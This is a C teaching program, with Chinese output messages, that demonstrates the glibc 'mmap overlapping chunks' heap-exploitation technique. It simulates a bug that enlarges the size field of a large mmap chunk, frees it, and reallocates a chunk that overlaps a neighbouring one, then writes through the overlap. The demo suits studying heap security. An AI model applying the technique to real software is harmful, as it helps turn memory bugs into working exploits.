#include <stdlib.h>
#include <stdio.h>

int main(){

    int* ptr1 = malloc(0x10); 

    printf("这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n");
    printf("分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n");
    printf("分配三个大小为 0x100000 的 chunk \n\n");

    long long* top_ptr = malloc(0x100000);
    printf("第一个 mmap 块位于 Libc 上方： %p\n",top_ptr);
    long long* mmap_chunk_2 = malloc(0x100000);
    printf("第二个 mmap 块位于 Libc 下方： %p\n", mmap_chunk_2);
    long long* mmap_chunk_3 = malloc(0x100000);
    printf("第三个 mmap 块低于第二个 mmap 块: %p\n", mmap_chunk_3);

    printf("\n当前系统内存布局\n" \
"================================================\n" \
"running program\n" \
"heap\n" \
"....\n" \
"third mmap chunk\n" \
"second mmap chunk\n" \
"LibC\n" \
"....\n" \
"ld\n" \
"first mmap chunk\n"
"===============================================\n\n" \
);
    
    printf("第一个 mmap 的 prev_size: 0x%llx\n", mmap_chunk_3[-2]);
    printf("第三个 mmap 的 size: 0x%llx\n\n", mmap_chunk_3[-1]);

    printf("假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n");  
    mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2;
    printf("现在改掉的第三个 mmap 块的大小是: 0x%llx\n", mmap_chunk_3[-1]);
    printf("free 掉第三个 mmap 块,\n\n");

    free(mmap_chunk_3); 

    printf("再分配一个很大的 mmap chunk\n");
    long long* overlapping_chunk = malloc(0x300000);
    printf("新申请的 Overlapped chunk 在: %p\n", overlapping_chunk);
    printf("Overlapped chunk 的大小是: 0x%llx\n", overlapping_chunk[-1]);

    int distance = mmap_chunk_2 - overlapping_chunk;
    printf("新的堆块与第二个 mmap 块之间的距离: 0x%x\n", distance);
    printf("写入之前 mmap chunk2 的 index0 写的是: %llx\n", mmap_chunk_2[0]);
    
    printf("编辑 overlapping chunk 的值\n");
    overlapping_chunk[distance] = 0x1122334455667788;

    printf("写之后第二个 chunk 的值: 0x%llx\n", mmap_chunk_2[0]);
    printf("Overlapped chunk 的值: 0x%llx\n\n", overlapping_chunk[distance]);
    printf("新块已与先前的块重叠\n");
}
